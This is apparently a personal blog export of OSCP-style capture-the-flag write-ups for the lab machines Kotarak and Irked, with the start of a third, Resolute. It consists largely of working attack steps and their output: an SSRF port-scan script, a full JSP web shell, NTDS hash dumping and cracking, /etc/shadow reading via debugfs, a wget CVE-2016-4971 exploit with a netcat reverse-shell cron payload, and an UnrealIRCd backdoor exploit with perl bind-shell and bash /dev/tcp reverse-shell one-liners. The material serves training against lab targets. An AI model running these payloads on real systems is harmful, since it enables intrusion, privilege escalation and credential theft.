[{"content":"","date":"28 March 2024","externalUrl":null,"permalink":"/","section":"Ani blog","summary":"","title":"Ani blog"},{"content":"","date":"28 March 2024","externalUrl":null,"permalink":"/tags/latteral-movements/","section":"Tags","summary":"","title":"Latteral Movements"},{"content":" Scanning : # Run nmap scan.\n\u0026gt; nmap -sV -sC -sS -T4 10.10.10.55 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA) | 256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA) |_ 256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519) 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: | Supported methods: GET HEAD POST PUT DELETE OPTIONS | Potentially risky methods: PUT DELETE |_ See https://nmap.org/nsedoc/scripts/ajp-methods.html 8080/tcp open http Apache Tomcat 8.5.5 |_http-title: Apache Tomcat/8.5.5 - Error report | http-methods: |_ Potentially risky methods: PUT DELETE |_http-favicon: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Scan all ports on the target.\n\u0026gt; nmap -p- -n -Pn -T5 --max-retries 1 10.10.10.55 -sS PORT STATE SERVICE 22/tcp open ssh 8009/tcp open ajp13 8080/tcp open http-proxy 60000/tcp open unknown We found unknow port lets see what service is behind.\n\u0026gt; nmap -p 60000 10.10.10.55 -sV -sC -T4 PORT STATE SERVICE VERSION 60000/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Kotarak Web Hosting Enumerating web app : # Use whatweb to get more informations about web server.\n\u0026gt; whatweb -a 3 http://10.10.10.55:60000/ http://10.10.10.55:60000/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.55], Title[Kotarak Web Hosting][Title element contains newline(s)!] Enumerate directory with dirsearch.\n\u0026gt; dirsearch -u http://10.10.10.55:60000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Go to your browser and open target web app.\nWe have an input users, that takes in parameter a url, lets try to put my web server url and maybe i will get request on it.\nLets try to do some SSRF with a little python script, this will connect a differents ports with 127.0.0.1 ip and it will show me the response of the server and maybe we will found some interresting content.\nimport requests url = \u0026#39;http://10.10.10.55:60000/url.php?path=http://127.0.0.1\u0026#39; for i in range(1000): r = requests.get(url + f\u0026#39;:{i}\u0026#39;) compte = len(r.content) if compte \u0026gt; 2 : print(f\u0026#34;port={i}\u0026#34;, \u0026#34;content : \\n\u0026#34;, r.text) but we can also do this with wfuzz.\n\u0026gt; wfuzz -c -z range,1-65000 --hl=2 -u http://10.10.10.55:60000/url.php?path=http://127.0.0.1:FUZZ This give some informations, we have an login page on port 320 lets see what is it.\nbut the script give me other ports, the 888 have some content so lets see what is going on it.\nIf we look at the source code of the page we can see that the application seems to fetch the files via a parameter in the url try to reproduce this\n\u0026lt;tr \u0026gt; \u0026lt;td width=\u0026#34;27\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;?doc=backup\u0026#34; class=\u0026#34;tableElement\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;inc/images/generic.png\u0026#34; alt=\u0026#34;dir\u0026#34; width=\u0026#34;22\u0026#34; height=\u0026#34;22\u0026#34; border=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;tableElement\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;?doc=backup\u0026#34; class=\u0026#34;tableElement\u0026#34;\u0026gt;backup\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;tableElementInfo\u0026#34;\u0026gt;\u0026amp;nbsp;2.22 kB\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;tableElementInfo\u0026#34;\u0026gt;\u0026amp;nbsp;18 07 2017 21:42:11\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; So on burpsuite intercept the request to http://10.10.10.55:60000/url.php?path=http://127.0.0.1:888/ and add the ?doc=backup before the url.\nLets goo, we find a clear text password I think it is tomcat credential admin:3@g01PdhB! .\nUse this credential to Login tomcat manager. http://10.10.10.55:8080/manager/html\nExploit Tomcat manager : # we will use the technique that concise to create a web shell with a .jsp.\nFirst create a file named index.jsp and this content on it.\n\u0026lt;FORM METHOD=GET ACTION=\u0026#39;index.jsp\u0026#39;\u0026gt; \u0026lt;INPUT name=\u0026#39;cmd\u0026#39; type=text\u0026gt; \u0026lt;INPUT type=submit value=\u0026#39;Run\u0026#39;\u0026gt; \u0026lt;/FORM\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;% String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); String output = \u0026#34;\u0026#34;; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } } catch(IOException e) { e.printStackTrace(); } } %\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;%=output %\u0026gt;\u0026lt;/pre\u0026gt; Execute the following command to package it as a .war file.\n\u0026gt; jar -cvf ../webshell.war index.jsp upload the war file on tomcat pannel and go /webshell/index.jsp to get the web shell.\nYou can get a reverse shell with nc onliner payload for exemple.\nPrivileges Escalation tomcat ⇒ atanas : # On the home of tomcat user we can find some interresting file.\n20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin which the name of the file i thinks this is a ntds active directory databases, this file can containt users hashs of the AD domain.\n\u0026gt; file 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above Download the file and use secretdump to dump the ntds db databases and get the NT hash.\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee::: WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487::: WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279::: WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772::: WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c::: atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: If we were from an active Directory environment we could have made pass the hash to connect unfortunately we on a linux machine try to break the hash of administrator and atanas.\nWith hashcat :\n\u0026gt; hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt e64fe0f24ba2489c05e64354d74ebd11:f16tomcat! But hashcat give me juste on password so i try on this site.\nLets try to move latteraly to atanas user. atanas:**f16tomcat!**\nmake id command you can see the current user is part of group disk.\nSo we can exploit this to get access on the root directory or for exemple read /etc/shadow.\nFirst we need to display the available partitions.\n\u0026gt; df -h Filesystem Size Used Avail Use% Mounted on udev 469M 0 469M 0% /dev tmpfs 98M 4.6M 93M 5% /run /dev/mapper/Kotarak--vg-root 6.4G 4.4G 2.1G 69% / tmpfs 488M 0 488M 0% /dev/shm tmpfs 5.0M 0 5.0M 0% /run/lock tmpfs 488M 0 488M 0% /sys/fs/cgroup /dev/sda1 117M 114M 2.8M 98% /boot tmpfs 98M 0 98M 0% /run/user/1000 now use debugfs to interact with the partition.\n\u0026gt; debugfs /dev/mapper/Kotarak--vg-root \u0026gt; debugfs: cat /etc/shadow root:$6$drWeP5N5$k65A2JoUsMISRA04wVOoXFOJVU.k7qxgBrvOD23S4mo6/aRlbnJbUNhvxiXdOe6rdyuvnkZY1po.Ym3q6uYhL0:17368:0:99999:7::: daemon:*:17001:0:99999:7::: bin:*:17001:0:99999:7::: sys:*:17001:0:99999:7::: sync:*:17001:0:99999:7::: games:*:17001:0:99999:7::: man:*:17001:0:99999:7::: lp:*:17001:0:99999:7::: mail:*:17001:0:99999:7::: news:*:17001:0:99999:7::: uucp:*:17001:0:99999:7::: proxy:*:17001:0:99999:7::: www-data:*:17001:0:99999:7::: backup:*:17001:0:99999:7::: list:*:17001:0:99999:7::: irc:*:17001:0:99999:7::: gnats:*:17001:0:99999:7::: nobody:*:17001:0:99999:7::: systemd-timesync:*:17001:0:99999:7::: systemd-network:*:17001:0:99999:7::: systemd-resolve:*:17001:0:99999:7::: systemd-bus-proxy:*:17001:0:99999:7::: syslog:*:17001:0:99999:7::: _apt:*:17001:0:99999:7::: lxd:*:17356:0:99999:7::: messagebus:*:17356:0:99999:7::: uuidd:*:17356:0:99999:7::: dnsmasq:*:17356:0:99999:7::: atanas:$6$V7BERjjx$jYM7HrbrhsMcdFtVeA/BPkUJbYqFDdHUvf7Sefwo7ywQ9eyW0lKTCHiFt0WIJ1qtKEVbySfsks9RonNVUX2LD/:17368:0:99999:7::: tomcat:!:17359:0:99999:7::: mysql:!:17359:0:99999:7::: lxc-dnsmasq:!:17366:0:99999:7::: sshd:*:17368:0:99999:7::: # Get the flag \u0026gt; debugfs: cat /root/flag.txt Getting closer! But what you are looking for can\u0026#39;t be found here. Exploit Wget version to Get root : # on the /root/app.log file we can see a connection from remote ip.\n10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] \u0026#34;GET /archive.tar.gz HTTP/1.1\u0026#34; 404 503 \u0026#34;-\u0026#34; \u0026#34;Wget/1.16 (linux-gnu)\u0026#34; 10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] \u0026#34;GET /archive.tar.gz HTTP/1.1\u0026#34; 404 503 \u0026#34;-\u0026#34; \u0026#34;Wget/1.16 (linux-gnu)\u0026#34; 10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] \u0026#34;GET /archive.tar.gz HTTP/1.1\u0026#34; 404 503 \u0026#34;-\u0026#34; \u0026#34;Wget/1.16 (linux-gnu)\u0026#34; Lets try to ping the ip.\n\u0026gt; ping -c 2 10.0.3.133 PING 10.0.3.133 (10.0.3.133) 56(84) bytes of data. 64 bytes from 10.0.3.133: icmp_seq=1 ttl=64 time=0.079 ms 64 bytes from 10.0.3.133: icmp_seq=2 ttl=64 time=0.071 ms So i try to open a web server to get the request but i get permission denied.\n\u0026gt; python3 -m http.server 80 Traceback (most recent call last): File \u0026#34;/usr/lib/python3.5/runpy.py\u0026#34;, line 184, in _run_module_as_main \u0026#34;__main__\u0026#34;, mod_spec) File \u0026#34;/usr/lib/python3.5/runpy.py\u0026#34;, line 85, in _run_code exec(code, run_globals) File \u0026#34;/usr/lib/python3.5/http/server.py\u0026#34;, line 1221, in \u0026lt;module\u0026gt; test(HandlerClass=handler_class, port=args.port, bind=args.bind) File \u0026#34;/usr/lib/python3.5/http/server.py\u0026#34;, line 1194, in test httpd = ServerClass(server_address, HandlerClass) File \u0026#34;/usr/lib/python3.5/socketserver.py\u0026#34;, line 440, in __init__ self.server_bind() File \u0026#34;/usr/lib/python3.5/http/server.py\u0026#34;, line 138, in server_bind socketserver.TCPServer.server_bind(self) File \u0026#34;/usr/lib/python3.5/socketserver.py\u0026#34;, line 454, in server_bind self.socket.bind(self.server_address) PermissionError: [Errno 13] Permission denied To bypass the retriction use authbind because it is install on the system.\n\u0026gt; authbind nc -nlvp 80 Listening on [0.0.0.0] (family 0, port 80) Connection from [10.0.3.133] port 80 [tcp/*] accepted (family 2, sport 51486) GET /archive.tar.gz HTTP/1.1 User-Agent: Wget/1.16 (linux-gnu) Accept: */* Host: 10.0.3.1 Connection: Keep-Alive So the version wget is vulnerable to remote code execution [(CVE-2016-4971)](https://www.exploit-db.com/exploits/40064)so try to exploit.\nFirst we need to prepares a malicious .wgetrc and we should starts an FTP server with python module, all the comand is on he victime machine :\n# Creat .wgetrc file \u0026gt; cat \u0026lt;\u0026lt;_EOF_\u0026gt;.wgetrc \u0026gt; post_file = /etc/shadow \u0026gt; output_document = /etc/cron.d/wget-root-shell \u0026gt; _EOF_ # you maybe need to install the lib before sudo pip install pyftpdlib \u0026gt; authbind python -m pyftpdlib -p21 -w Now take this exploit on github, you need to edit the exploit like this\n# IP address of the victim machine HTTP_LISTEN_IP = \u0026#39;0.0.0.0\u0026#39; HTTP_LISTEN_PORT = 80 FTP_HOST = \u0026#39;10.0.3.1\u0026#39; FTP_PORT = 21 # Payload on cronjob ROOT_CRON = \u0026#34;* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.3.1 4444 \u0026gt;/tmp/f \\n\u0026#34; Now run the exploit always with authbind to bypass ports retrictions.\n#open nc listener always in victim machine \u0026gt; nc -lnvp 4444 # Run the exploit and wait a few minutes \u0026gt; authbind python exploit.py Ready? Is your FTP server running? FTP found open on 10.0.3.1:21. Let\u0026#39;s go then Serving wget exploit on port 80... We have a volunteer requesting /archive.tar.gz by GET :) Uploading .wgetrc via ftp redirect vuln. It should land in /root 10.0.3.133 - - [23/Mar/2024 14:48:01] \u0026#34;GET /archive.tar.gz HTTP/1.1\u0026#34; 301 - Sending redirect to ftp://anonymous@10.0.3.1:21/.wgetrc We have a volunteer requesting /archive.tar.gz by POST :) Received POST from wget, this should be the extracted /etc/shadow file: ---[begin]--- root:*:17366:0:99999:7::: daemon:*:17366:0:99999:7::: bin:*:17366:0:99999:7::: sys:*:17366:0:99999:7::: sync:*:17366:0:99999:7::: games:*:17366:0:99999:7::: man:*:17366:0:99999:7::: lp:*:17366:0:99999:7::: mail:*:17366:0:99999:7::: news:*:17366:0:99999:7::: uucp:*:17366:0:99999:7::: proxy:*:17366:0:99999:7::: www-data:*:17366:0:99999:7::: backup:*:17366:0:99999:7::: list:*:17366:0:99999:7::: irc:*:17366:0:99999:7::: gnats:*:17366:0:99999:7::: nobody:*:17366:0:99999:7::: systemd-timesync:*:17366:0:99999:7::: systemd-network:*:17366:0:99999:7::: systemd-resolve:*:17366:0:99999:7::: systemd-bus-proxy:*:17366:0:99999:7::: syslog:*:17366:0:99999:7::: _apt:*:17366:0:99999:7::: sshd:*:17366:0:99999:7::: ubuntu:$6$edpgQgfs$CcJqGkt.zKOsMx1LCTCvqXyHCzvyCy1nsEg9pq1.dCUizK/98r4bNtLueQr4ivipOiNlcpX26EqBTVD2o8w4h0:17368:0:99999:7::: ---[eof]--- Sending back a cronjob script as a thank-you for the file... It should get saved in /etc/cron.d/wget-root-shell on the victim\u0026#39;s host (because of .wgetrc we injected in the GET first response) 10.0.3.133 - - [23/Mar/2024 14:50:01] \u0026#34;POST /archive.tar.gz HTTP/1.1\u0026#34; 200 - File was served. Check on /root/hacked-via-wget on the victim\u0026#39;s host in a minute! :) Check your listener after one minut the cronjob is running we get the reverse shell.\nThis boxing was really fun to do it is realy uncommon to meet a second network system with a second machine ( even if it is docker ) in this type of machine. 😼\n","date":"28 March 2024","externalUrl":null,"permalink":"/posts/kotarak/","section":"Posts","summary":"Scanning : # Run nmap scan.","title":"OSCP boxe - Kotarak"},{"content":"","date":"28 March 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"28 March 2024","externalUrl":null,"permalink":"/tags/ssrf/","section":"Tags","summary":"","title":"SSRF"},{"content":"","date":"28 March 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"28 March 2024","externalUrl":null,"permalink":"/tags/wget-rce/","section":"Tags","summary":"","title":"Wget RCE"},{"content":"","date":"21 March 2024","externalUrl":null,"permalink":"/tags/irc/","section":"Tags","summary":"","title":"IRC"},{"content":" Scanning : # Begin with nmap scan to enumerate open ports and services behind the port.\n\u0026gt; nmap -sS -sC -sV -n -T4 10.10.10.117 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.10 (Debian) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 37579/tcp status | 100024 1 38289/tcp6 status | 100024 1 40649/udp status |_ 100024 1 47590/udp6 status Enumerate all ports.\n\u0026gt; nmap -p- -n -Pn -T5 --max-retries 1 10.10.10.117 -sS 6697/tcp open ircs-u 8067/tcp open infi-async 37579/tcp open unknown 65534/tcp open unknown Enumerate Portmapper : # Use rpcinfo to get information about the service.\n\u0026gt; rpcinfo 10.10.10.117 program version netid address service owner 100000 4 tcp6 ::.0.111 portmapper superuser 100000 3 tcp6 ::.0.111 portmapper superuser 100000 4 udp6 ::.0.111 portmapper superuser 100000 3 udp6 ::.0.111 portmapper superuser 100000 4 tcp 0.0.0.0.0.111 portmapper superuser 100000 3 tcp 0.0.0.0.0.111 portmapper superuser 100000 2 tcp 0.0.0.0.0.111 portmapper superuser 100000 4 udp 0.0.0.0.0.111 portmapper superuser 100000 3 udp 0.0.0.0.0.111 portmapper superuser 100000 2 udp 0.0.0.0.0.111 portmapper superuser 100000 4 local /run/rpcbind.sock portmapper superuser 100000 3 local /run/rpcbind.sock portmapper superuser 100024 1 udp 0.0.0.0.158.201 status 107 100024 1 tcp 0.0.0.0.146.203 status 107 100024 1 udp6 ::.185.230 status 107 100024 1 tcp6 ::.149.145 status 107 But i dosen’t get more informations.\nEnumerate IRC : # As you can see the we have an open port with irc protocol.\n\u0026gt; nmap -sV -sC -p 6697 10.10.10.117 PORT STATE SERVICE VERSION 6697/tcp open irc UnrealIRCd Useful nmap script to get more informations\n\u0026gt; nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 10.10.10.117 PORT STATE SERVICE VERSION 6697/tcp open irc UnrealIRCd | irc-botnet-channels: |_ ERROR: TIMEOUT |_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277 As you can see the nmap see the version of this service look like vulnerable to a backdoor lets search more information about this on internet.\nFull Disclosure: Fw: [irc-security] UnrealIRCd 3.2.8.1 backdoored on official ftp and site\nExploit CVE-2010-2075 : # Get this github poc to exploit the backdoor.\nGitHub - Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor: My backdoor script for a vulnerable version of UnrealIRCd\nYou need to add your ip and the port on the exploit code.\nNow run nc listener and the launch the exploit.\n# run listener \u0026gt; pwncat-cs :1337 # run the exploit \u0026gt; python exploit.py 10.10.10.117 6697 -payload netcat Just wait a few seconds and get your shell.\nWe can do it manualy because it was more stable, so create a bind shell ayload with msfvenom.\n\u0026gt; msfvenom -p cmd/unix/bind_perl LHOST=10.10.10.117 connect on the irc channel and enter the payload.\n\u0026gt; nc -vn 10.10.10.117 6697 (UNKNOWN) [10.10.10.117] 6697 (ircs-u) open :irked.htb NOTICE AUTH :*** Looking up your hostname... AB;perl -MIO -e \u0026#39;$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)-\u0026gt;accept;$~-\u0026gt;fdopen($c,w);STDIN-\u0026gt;fdopen($c,r);while(\u0026lt;\u0026gt;){if($_=~ /(.*)/){system $1;}};\u0026#39; # connet to bind adress \u0026gt; nc -vn 10.10.10.117 4444 (UNKNOWN) [10.10.10.117] 4444 (?) open id uid=1001(ircd) gid=1001(ircd) groups=1001(ircd) Privileges Escalation : # Upload linpeas to enumerate system.\n# open web server on the same directory of the linpeas script \u0026gt; python3 -m http.server 80 # Download linpeas on the target \u0026gt; wget http://10.10.14.10/linpeas.sh # run linpeas \u0026gt; chmod +x linpeas.sh \u0026amp;\u0026amp; ./linpeas.sh when we look SUID binary enmeration, linpeas find unknow SUID name /usr/bin/viewuser .\n╔══════════╣ SUID - Check easy privesc, exploits and write perms ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid strace Not Found -rwsr-xr-- 1 root messagebus 355K Nov 21 2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 9.3K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 14K Sep 8 2016 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 550K Nov 19 2017 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Oct 14 2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary!) -rwsr-xr-x 1 root root 1.1M Feb 10 2018 /usr/sbin/exim4 -rwsr-xr-- 1 root dip 332K Apr 14 2015 /usr/sbin/pppd ---\u0026gt; Apple_Mac_OSX_10.4.8(05-2007) -rwsr-xr-x 1 root root 43K May 17 2017 /usr/bin/chsh -rwsr-sr-x 1 root mail 94K Nov 18 2017 /usr/bin/procmail -rwsr-xr-x 1 root root 77K May 17 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 38K May 17 2017 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-sr-x 1 daemon daemon 50K Sep 30 2014 /usr/bin/at ---\u0026gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 18K Sep 8 2016 /usr/bin/pkexec ---\u0026gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) -rwsr-sr-x 1 root root 9.3K Apr 1 2014 /usr/bin/X -rwsr-xr-x 1 root root 52K May 17 2017 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 52K May 17 2017 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 7.2K May 16 2018 /usr/bin/viewuser (Unknown SUID binary!) -rwsr-xr-x 1 root root 95K Aug 13 2014 /sbin/mount.nfs -rwsr-xr-x 1 root root 38K May 17 2017 /bin/su -rwsr-xr-x 1 root root 34K Mar 29 2015 /bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 34K Jan 21 2016 /bin/fusermount -rwsr-xr-x 1 root root 158K Jan 28 2017 /bin/ntfs-3g ---\u0026gt; Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017) -rwsr-xr-x 1 root root 26K Mar 29 2015 /bin/umount ---\u0026gt; BSD/Linux(08-1996) Get informations to the type of the file, it is a Linux ELF binary.\n\u0026gt; file /usr/bin/viewuser /usr/bin/viewuser: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=69ba4bc75bf72037f1ec492bc4cde2550eeac4bb, not stripped Download the file using nc to analyse it localy.\n# ATTACKER MACHINE \u0026gt; nc -lnvp 4444 \u0026gt; binary # VICTIM MACHINE \u0026gt; nc 10.10.14.10 4444 \u0026lt; /usr/bin/viewuser when you get the binary localy lets use strings command to get caractere strings. a rather strange thing is the presence of a file named listusers\n\u0026gt; strings binary We will now launch the binary but we will try to find more information about internal process with the ltrace tool.\n\u0026gt; ltrace ./binary __libc_start_main(0x5665357d, 1, 0xff8c67a4, 0x56653600 \u0026lt;unfinished ...\u0026gt; puts(\u0026#34;This application is being devleo\u0026#34;...This application is being devleoped to set and test user permissions ) = 69 puts(\u0026#34;It is still being actively devel\u0026#34;...It is still being actively developed ) = 37 system(\u0026#34;who\u0026#34;kali tty7 2024-03-21 03:35 (:0) \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 0 setuid(0) = 0 system(\u0026#34;/tmp/listusers\u0026#34;sh: 1: /tmp/listusers: not found \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 32512 +++ exited (status 0) +++ As you can see the binary run system instruction, it means that the file listusers is executed by the binary, I will create a file named listusers and we will put it with reverse shell in bash and it will by exec by the binary.\n# do not forget to do this in /tmp \u0026gt; touch listusers \u0026amp;\u0026amp; echo \u0026#39;#!/bin/bash \\nsh -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.10/4444 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; listusers # give read and exec right the listusers \u0026gt; chmod +rx listusers # run listener \u0026gt; nc -lnvp 4444 Run the binary and and get your shell as root. Now repeat the operation but on the target machine.\n# Download the reverse shell on target machine \u0026gt; wget http://10.10.14.10/listusers \u0026gt; chmod +xr listusers \u0026gt; /usr/bin/viewuser GG Irked is pwn, Great boxe ! 😎\n","date":"21 March 2024","externalUrl":null,"permalink":"/posts/irked/","section":"Posts","summary":"Scanning : # Begin with nmap scan to enumerate open ports and services behind the port.","title":"OSCP boxe - Irked"},{"content":"","date":"21 March 2024","externalUrl":null,"permalink":"/tags/suid/","section":"Tags","summary":"","title":"SUID"},{"content":"","date":"17 March 2024","externalUrl":null,"permalink":"/tags/active-directory/","section":"Tags","summary":"","title":"Active Directory"},{"content":" Resolute - OSCP boxe # Scanning : # Nmap scan to see open ports and services :\n\u0026gt; nmap 10.10.10.169 -sC -sV -Pn -T4 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-16 09:22:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m11s, deviation: 4h02m30s, median: 7m10s | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2024-03-16T09:22:34 |_ start_date: 2024-03-16T09:19:30 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Resolute | NetBIOS computer name: RESOLUTE\\x00 | Domain name: megabank.local | Forest name: megabank.local | FQDN: Resolute.megabank.local |_ System time: 2024-03-16T02:22:32-07:00 Its was a domain controleur so lets add the domaine, the FQDN and the ip to your /etc/hosts file.\necho \u0026#34;10.10.10.169 megabank.local RESOLUTE.megabank.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumerat SMB : # Lets try to connect on the smb service using nul creds or null session.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\: Lets try to enumerate users in the domain.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --users [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\: SMB 10.10.10.169 445 RESOLUTE [*] Trying to dump local users with SAMRPC protocol SMB 10.10.10.169 445 RESOLUTE [+] Enumerated domain user(s) SMB 10.10.10.169 445 RESOLUTE megabank.local\\Administrator Built-in account for administering the computer/domain SMB 10.10.10.169 445 RESOLUTE megabank.local\\Guest Built-in account for guest access to the computer/domain SMB 10.10.10.169 445 RESOLUTE megabank.local\\krbtgt Key Distribution Center Service Account SMB 10.10.10.169 445 RESOLUTE megabank.local\\DefaultAccount A user account managed by the system. SMB 10.10.10.169 445 RESOLUTE megabank.local\\ryan SMB 10.10.10.169 445 RESOLUTE megabank.local\\marko Account created. Password set to Welcome123! SMB 10.10.10.169 445 RESOLUTE megabank.local\\sunita SMB 10.10.10.169 445 RESOLUTE megabank.local\\abigail SMB 10.10.10.169 445 RESOLUTE 